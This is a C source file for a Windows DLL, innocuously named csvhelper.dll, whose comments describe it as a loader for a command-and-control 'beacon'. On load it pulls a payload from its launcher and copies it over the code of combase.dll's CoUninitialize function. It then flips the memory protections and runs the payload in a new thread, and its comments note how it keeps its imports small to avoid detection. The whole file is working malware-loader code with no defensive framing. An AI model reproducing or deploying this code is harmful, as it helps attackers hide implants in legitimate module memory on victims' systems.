/*
 * plugin.c — csvhelper.dll: combase.dll slot loader
 *
 * All work happens in DllMain, which runs synchronously during the
 * launcher's LoadLibraryA call. Plaintext PICO is retrieved from the
 * launcher EXE via its GetPayload export, copied into combase's
 * CoUninitialize slot (RW → memcpy → RX), and the beacon thread handle
 * is handed back to the launcher through SetThreadHandle.
 *
 * combase.dll must already be resident — the launcher pre-loads it so
 * we resolve with GetModuleHandleW alone, avoiding a LoadLibrary call
 * under the loader lock.
 *
 * IAT: kernel32 only — GetModuleHandleW, GetProcAddress, VirtualProtect,
 * CreateThread. No LoadLibrary, no bcrypt, no advapi32, no filesystem.
 */

#include <windows.h>

typedef void  (WINAPI *pfnGetPayload)(void **, SIZE_T *);
typedef void  (WINAPI *pfnSetThreadHandle)(HANDLE);

BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved)
{
    (void)reserved;

    if (reason != DLL_PROCESS_ATTACH)
        return TRUE;

    DisableThreadLibraryCalls(hinst);

    HMODULE exe = GetModuleHandleW(NULL);
    if (!exe) return FALSE;

    pfnGetPayload gp = (pfnGetPayload)GetProcAddress(exe, "GetPayload");
    if (!gp) return FALSE;

    void *pt = NULL;
    SIZE_T len = 0;
    gp(&pt, &len);
    if (!pt || !len) return FALSE;

    HMODULE combase = GetModuleHandleW(L"combase.dll");
    if (!combase) return FALSE;

    void *slot = (void *)GetProcAddress(combase, "CoUninitialize");
    if (!slot) return FALSE;

    DWORD old;
    if (!VirtualProtect(slot, len, PAGE_READWRITE, &old)) return FALSE;
    memcpy(slot, pt, len);
    if (!VirtualProtect(slot, len, PAGE_EXECUTE_READ, &old)) return FALSE;

    HANDLE t = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)slot, NULL, 0, NULL);
    if (!t) return FALSE;

    pfnSetThreadHandle sh = (pfnSetThreadHandle)GetProcAddress(exe, "SetThreadHandle");
    if (sh) sh(t);

    return TRUE;
}
